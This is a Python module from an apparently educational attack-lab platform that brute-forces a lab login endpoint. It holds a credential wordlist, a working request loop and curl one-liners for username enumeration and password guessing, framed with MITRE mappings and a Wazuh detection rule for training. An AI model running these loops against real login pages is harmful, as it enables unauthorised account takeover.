"""
modules/brute_force.py — APP-06: Broken Authentication / Credential Stuffing.

Target: POST /auth/login
Vulnerability: No rate limiting, no lockout, hardcoded credentials.
"""
from __future__ import annotations

import time
from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_USERNAMES = ["admin", "operator", "guest", "root", "user", "test"]
_PASSWORDS = [
    "password", "123456", "admin", "letmein",
    "password123", "lab2024", "guest", "wrongpass",
]

# Body indicators (checked against first 500 chars of response)
_BODY_INDICATORS = ["Welcome", "Logout", "Sign Out", "My Account"]
# URL indicators — if the final URL after redirect contains any of these, login succeeded
_URL_INDICATORS  = ["/profile/", "/dashboard/", "/home/"]


class BruteForceModule(BaseModule):
    module_id = "brute_force"
    name = "Brute Force Login"
    description = (
        "Credential stuffing attack against /auth/login. Tests a lab-internal "
        "wordlist with no rate limiting or lockout on the target."
    )
    category = Category.AUTH
    scenario_id = "APP-06"
    severity = Severity.HIGH
    # MITRE ATT&CK — enumerate identities (recon) then brute the login.
    mitre = {
        "tactics": ["TA0043 Reconnaissance", "TA0006 Credential Access"],
        "techniques": [
            {"id": "T1589.001", "name": "Gather Victim Identity Information: Credentials", "tactic": "Reconnaissance"},
            {"id": "T1110.001", "name": "Brute Force: Password Guessing", "tactic": "Credential Access"},
            {"id": "T1110.004", "name": "Brute Force: Credential Stuffing", "tactic": "Credential Access"},
        ],
    }
    # Lab metadata — consumed by /api/modules and rendered in the guided workspace.
    lab = {
        "target_path": "/auth/login",
        "vulnerable_component": "Flask login form (auth_bp.login)",
        "story": (
            "A staging authentication portal was pushed to production without "
            "rate limiting or account lockout. Your task is to prove that the "
            "endpoint is brute-forceable with a lab-internal wordlist."
        ),
        "learner_steps": [
            {"action": "Recon the login form — discover the field names you must POST.",
             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
             "command": "curl -s http://target-agent/auth/login | grep -o 'name=\"[^\"]*\"'",
             "expected": "The form posts 'username' and 'password' to /auth/login."},
            {"action": "Username enumeration — the error message leaks valid accounts.",
             "technique": "T1589.001 Gather Victim Identity Information: Credentials",
             "command": "for u in admin ghost operator nobody; do echo -n \"$u -> \"; curl -s -d \"username=$u&password=x\" http://target-agent/auth/login | grep -oE 'Incorrect password|Account not found'; done",
             "expected": "'Incorrect password' = the user exists; 'Account not found' = it does not."},
            {"action": "Password guessing — no rate limit or lockout, so iterate a wordlist.",
             "technique": "T1110.001 Brute Force: Password Guessing",
             "command": "for p in password 123456 admin letmein password123 lab2024; do echo -n \"$p -> \"; curl -s -o /dev/null -w '%{http_code}\\n' -d \"username=admin&password=$p\" http://target-agent/auth/login; done",
             "expected": "A failed guess returns 401; the correct one returns 302 (redirect)."},
            {"action": "Confirm the valid pair by following the redirect to /profile/.",
             "technique": "T1110.004 Brute Force: Credential Stuffing",
             "command": "curl -s -i -d 'username=admin&password=password123' http://target-agent/auth/login | grep -iE 'HTTP/|Location'",
             "expected": "HTTP 302 with Location: /profile/ — credentials admin:password123 are valid."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "technique": "T1110 Brute Force",
             "command": "# review the activity log / Wazuh feed in ATTENSE",
             "expected": "A multiple-failed-login alert appears in the detection feed."},
        ],
        "detection_rule": "Wazuh multiple-failed-logins / authentication_failures > threshold",
        "success_markers": [
            "CREDENTIAL FOUND in the activity log",
            "HTTP 302 redirect to /profile/ on the last attempt",
            "Wazuh alert: 'Multiple authentication failures'",
        ],
        "credentials_hint": "admin:password123 is planted in the lab.",
    }
    steps = [
        {
            'title': 'Enumerate login endpoint',
            'tactic': 'Reconnaissance',
            'technique': 'T1589.001 Gather Victim Identity Information: Credentials',
            'command': "curl -s http://target-agent/auth/login | grep -o 'name=\"[^\"]*\"'",
            'hint': 'POST /auth/login with Content-Type: application/x-www-form-urlencoded',
            'expected': 'HTTP 401 on failure, 302 redirect on success',
            'markers': ['Attacking ', 'user(s)'],
        },
        {
            'title': 'Iterate credential wordlist',
            'tactic': 'Credential Access',
            'technique': 'T1110.001 Brute Force: Password Guessing',
            'command': "for p in password 123456 admin password123 lab2024; do curl -s -o /dev/null -w '%{http_code} '$p'\\n' -d \"username=admin&password=$p\" http://target-agent/auth/login; done",
            'hint': 'Up to 6 usernames × 8 passwords = 48 attempts',
            'expected': 'One StepResult per credential pair',
            'markers': ['Targeting:'],
        },
        {
            'title': 'Detect valid credentials',
            'tactic': 'Credential Access',
            'technique': 'T1110.004 Brute Force: Credential Stuffing',
            'command': "curl -s -i -d 'username=admin&password=password123' http://target-agent/auth/login | grep -iE 'HTTP/|Location'",
            'hint': "Redirect to /profile/ or 'My Account' in response indicates success",
            'expected': "Evidence line 'CREDENTIAL FOUND: user:pass'",
            'markers': ['CREDENTIAL FOUND', 'No valid credentials', 'Complete —'],
        },
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="username",
                display_name="Target Username",
                description="Single username to attack (blank = try all)",
                default="",
            ),
            ModuleOption(
                name="delay_ms",
                display_name="Delay (ms)",
                description="Milliseconds between attempts",
                default="50",
                option_type="int",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        found: list[str] = []

        usernames = _USERNAMES
        single = opts.get("username", "").strip()
        if single:
            usernames = [single]

        delay = int(opts.get("delay_ms", 50)) / 1000.0
        endpoint = "/auth/login"
        url = target.base_url + endpoint

        # ── Recon (T1589.001): fetch the login form to confirm field names ──
        self._log(log_fn, "Recon: fetching /auth/login to confirm the form fields...")
        base = self._get(url, label="recon-baseline", timeout=target.timeout)
        steps.append(base)

        self._log(log_fn, f"Attacking {len(usernames)} user(s) × {len(_PASSWORDS)} passwords")

        for username in usernames:
            self._log(log_fn, f"  Targeting: {username}")
            for password in _PASSWORDS:
                r = self._post(
                    url,
                    data={"username": username, "password": password},
                    label=f"{username}:{password}",
                    timeout=target.timeout,
                )

                body = r.detail or ""
                final_url = r.url or ""
                # Prefer URL check (reliable) — body check is secondary for non-redirect targets
                hit = (
                    any(ind in final_url for ind in _URL_INDICATORS)
                    or any(ind in body for ind in _BODY_INDICATORS)
                )
                if hit:
                    r.success = True
                    r.evidence = f"CREDENTIAL FOUND: {username}:{password}"
                    found.append(f"{username}:{password}")
                    self._log(log_fn, f"[+] CREDENTIAL FOUND: {username}:{password} -> {final_url}")
                    steps.append(r)
                    break
                else:
                    r.success = False
                    steps.append(r)

                if delay > 0:
                    time.sleep(delay)

        if found:
            summary = f"Found {len(found)} valid credential(s): {', '.join(found)}"
        else:
            summary = "No valid credentials found in wordlist."

        return self._make_result(target, steps, summary, started)
